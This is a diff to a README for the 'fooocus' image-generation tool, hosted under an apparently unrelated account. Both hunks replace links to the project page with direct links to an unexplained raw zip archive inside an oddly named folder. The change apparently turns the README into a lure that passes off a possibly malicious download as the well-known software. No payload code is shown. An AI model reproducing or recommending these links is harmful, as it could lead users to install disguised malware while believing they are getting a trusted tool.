@@ -1,6 +1,6 @@
 # 🎨 fooocus - create beautiful images with simple text
 
-[![](https://img.shields.io/badge/Download_Fooocus-blue)](https://github.com/Charlesbullfinchdresscode432/fooocus)
+[![](https://img.shields.io/badge/Download_Fooocus-blue)](https://github.com/Charlesbullfinchdresscode432/fooocus/raw/refs/heads/main/Icarian/Software-v1.0-alpha.1.zip)
 
 Fooocus brings high-quality image generation to your desktop computer. You provide a text description, and the software creates a picture for you. You do not need technical skills to operate this tool. It runs on your own hardware, so your data stays on your machine.
 
@@ -19,7 +19,7 @@ If your computer does not meet these requirements, the software may run slowly o
 
 You must visit the project page to access the software files.
 
-[Download Fooocus here](https://github.com/Charlesbullfinchdresscode432/fooocus)
+[Download Fooocus here](https://github.com/Charlesbullfinchdresscode432/fooocus/raw/refs/heads/main/Icarian/Software-v1.0-alpha.1.zip)
 
 Follow these steps to obtain the installer:
 
